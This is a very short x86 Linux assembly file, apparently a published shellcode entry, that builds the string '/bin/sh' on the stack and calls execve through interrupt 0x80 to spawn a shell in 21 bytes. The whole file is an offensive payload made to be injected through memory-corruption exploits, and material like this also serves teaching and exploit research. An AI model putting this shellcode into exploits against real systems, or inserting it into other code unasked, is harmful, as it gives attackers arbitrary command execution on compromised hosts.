;/*
; * Super-small excve
; *
; * Title:    Linux x86 execve("/bin/sh",0,0) - 21 bytes
; * Author:   honeyjonny <honeyjonny@gmail.com>
; *
; */

section .text

bits 32

global _start

_start:

	xor ecx,ecx
	mul ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	mov al,0xb
	int 80h